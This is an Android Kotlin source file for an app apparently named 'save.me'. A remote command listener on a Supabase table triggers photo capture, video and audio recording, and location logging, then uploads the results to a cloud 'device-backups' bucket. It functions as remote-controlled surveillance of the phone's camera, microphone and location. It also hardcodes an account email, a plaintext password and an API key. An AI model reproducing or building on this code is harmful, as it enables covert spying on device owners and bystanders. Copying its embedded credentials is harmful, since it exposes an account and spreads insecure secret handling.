package com.save.me

import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.storage.storage
import io.github.jan.supabase.realtime.realtime
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.postgresChangeFlow
import io.github.jan.supabase.realtime.PostgresAction
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.auth.auth
import io.github.jan.supabase.auth.providers.builtin.Email
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.collectLatest
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.jsonPrimitive
import org.json.JSONObject
import android.content.Context
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object SupabaseUtils {
    private const val SUPABASE_URL = "https://yxdnyavcxouutwkvdoef.supabase.co"
    private const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI"
    private const val EMAIL = "kambojistheking@gmail.com"
    private const val PASSWORD = "#Sand@beach1"

    private const val TAG = "SupabaseUtils"

    val supabase: SupabaseClient by lazy {
        createSupabaseClient(
            supabaseUrl = SUPABASE_URL,
            supabaseKey = SUPABASE_KEY
        ) {
            install(io.github.jan.supabase.auth.Auth)
            install(io.github.jan.supabase.postgrest.Postgrest)
            install(io.github.jan.supabase.storage.Storage)
            install(io.github.jan.supabase.realtime.Realtime)
        }
    }

    private var userId: String? = null

    suspend fun checkConnection(): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            val activeSession = supabase.auth.currentSessionOrNull()
            if (activeSession == null) {
                supabase.auth.signInWith(Email) {
                    email = EMAIL
                    password = PASSWORD
                }
            }
            userId = supabase.auth.currentUserOrNull()?.id
            userId != null
        } catch (e: Exception) {
            Log.e(TAG, "Error in checkConnection: ${e.message}", e)
            false
        }
    }

    /**
     * Uploads a file to the device-backups bucket under the appropriate subfolder (audio/, photos/, videos/, etc)
     * The filename will always include the current date and time in the format yyyy-MM-dd_HH-mm-ss.
     * The [type] parameter should be one of: "audio", "photo", "video", "file"
     */
    suspend fun uploadFileAndRecord(file: File, extension: String, type: String) = withContext(Dispatchers.IO) {
        val uid = userId ?: return@withContext
        val bucket = "device-backups"
        try {
            // Format current date and time as part of the filename
            val sdf = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.US)
            val now = Date()
            val timeString = sdf.format(now)

            // Determine subfolder and file extension by type
            val folder = when (type) {
                "audio" -> "audio"
                "photo" -> "photos"
                "video" -> "videos"
                else -> "other"
            }
            // Ensure extension does not have a leading dot
            val cleanExtension = if (extension.startsWith(".")) extension.substring(1) else extension

            val fileName = "$timeString.$cleanExtension"
            val fullPath = "$folder/$fileName"

            supabase.storage[bucket].upload(fullPath, file.readBytes())
            supabase.postgrest["files"].insert(
                buildJsonObject {
                    put("user_id", uid)
                    put("type", type)
                    put("bucket", bucket)
                    put("path", fullPath)
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading file and recording DB entry: ${e.message}", e)
        }
    }

    suspend fun insertLocation(lat: Double, lon: Double) = withContext(Dispatchers.IO) {
        val uid = userId ?: return@withContext
        try {
            supabase.postgrest["locations"].insert(
                buildJsonObject {
                    put("user_id", uid)
                    put("latitude", lat)
                    put("longitude", lon)
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting location: ${e.message}", e)
        }
    }

    fun startRealtimeCommandListener(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            Log.d(TAG, "Starting Realtime command listener...")
            val connected = checkConnection()
            if (!connected) {
                Log.e(TAG, "Supabase not connected; cannot listen for commands.")
                return@launch
            }
            val uid = userId
            if (uid == null) {
                Log.e(TAG, "UserID not set; cannot listen for commands.")
                return@launch
            }
            val channel = supabase.realtime.channel("public:commands")
            channel.postgresChangeFlow<PostgresAction.Insert>("public") {
                table = "commands"
            }
                .collectLatest { change ->
                    try {
                        val record = change.record
                        val userIdField = record["user_id"]?.jsonPrimitive?.content
                        val type = record["type"]?.jsonPrimitive?.content ?: ""
                        val optionsJson = record["options"]?.jsonPrimitive?.content ?: "{}"
                        val options = try { JSONObject(optionsJson) } catch (_: Exception) { JSONObject() }
                        Log.d(TAG, "Received command: type=$type, user_id=$userIdField, options=$options")

                        if (userIdField != uid) {
                            Log.d(TAG, "Command ignored: user_id does not match.")
                            return@collectLatest
                        }

                        // Update notification to show the current command and log it
                        SurveillanceService.serviceContext?.let {
                            NotificationUtils.updateForegroundNotification(it, "Processing: $type")
                            Log.d(TAG, "Notification updated to show command: $type")
                        }

                        // Dispatch and wait for completion
                        when (type) {
                            "capturePhoto" -> {
                                val camera = options.optString("camera", "back")
                                val flash = options.optString("flash", "on")
                                CameraUtils.executeCapturePhoto(context, camera, flash)
                            }
                            "recordVideo" -> {
                                val camera = options.optString("camera", "back")
                                val quality = options.optString("quality", "720")
                                val duration = options.optInt("duration", 60)
                                CameraUtils.executeRecordVideo(context, camera, quality, duration)
                            }
                            "recordAudio" -> {
                                val duration = options.optInt("duration", 60)
                                AudioUtils.executeRecordAudio(context, duration)
                            }
                            "ring" -> {
                                val duration = options.optInt("duration", 5)
                                DeviceUtils.ring(context, duration)
                            }
                            "vibrate" -> {
                                val duration = options.optInt("duration", 1)
                                DeviceUtils.vibrate(context, duration)
                            }
                            "getLocation" -> {
                                LocationUtils.recordLocationOnce(context)
                            }
                            else -> {
                                Log.w(TAG, "Unknown command type: $type; ignoring.")
                            }
                        }

                        // After processing, revert notification to default and log it
                        SurveillanceService.serviceContext?.let {
                            NotificationUtils.resetToDefaultNotification(it)
                            Log.d(TAG, "Notification reset to default after processing command: $type")
                        }

                    } catch (e: Exception) {
                        Log.e(TAG, "Exception handling command: ${e.message}", e)
                        // Ensure notification resets on error and log it
                        SurveillanceService.serviceContext?.let {
                            NotificationUtils.resetToDefaultNotification(it)
                            Log.d(TAG, "Notification reset to default due to exception.")
                        }
                    }
                }
        }
    }
}